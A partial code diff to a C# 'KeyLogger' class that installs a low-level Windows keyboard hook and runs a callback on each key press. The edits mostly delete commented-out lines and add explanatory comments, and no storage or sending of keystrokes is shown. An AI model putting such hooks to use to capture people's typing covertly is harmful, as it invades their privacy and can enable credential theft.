@@ -3,7 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using System.Diagnostics;
+using System.Diagnostics;//Provides classes that allow you to interact with system processes, event logs, and performance counters.
 using System.Threading;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
@@ -43,15 +43,9 @@ namespace Child
         /// </summary>
         /// <param name="CallBackFunc"> Function That run at Key Pressed</param>
         public KeyLogger(Action<object> CallBackFunc)
-        {
-            
-            //Application.EnableVisualStyles();
-            //Application.SetCompatibleTextRenderingDefault(false);
-            
+        {  
             CallBackFunction = new Thread(new ParameterizedThreadStart(CallBackFunc));
             Act = CallBackFunc;
-
-            //Application.Run();
 
         }
         /// <summary>
@@ -65,7 +59,6 @@ namespace Child
             using (ProcessModule curModule = curProcess.MainModule)
             {
                 
-                //IntPtrList.Add(GetModuleHandle(curModule.ModuleName));
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
             }
         }
@@ -102,7 +95,6 @@ namespace Child
 
                         wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_SYSKEYDOWN));
                 }
-            //Process Current = Process.GetCurrentProcess();
             SM.WaitOne();
 
             Thread Temp = new Thread(new ParameterizedThreadStart(Act));
@@ -123,7 +115,7 @@ namespace Child
         /// </summary>
         public void StopLogger()
         {
-            UnhookWindowsHookEx(_hookID);
+            UnhookWindowsHookEx(_hookID);//Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
             Runing = false;
         }
         internal static class InterceptKeys
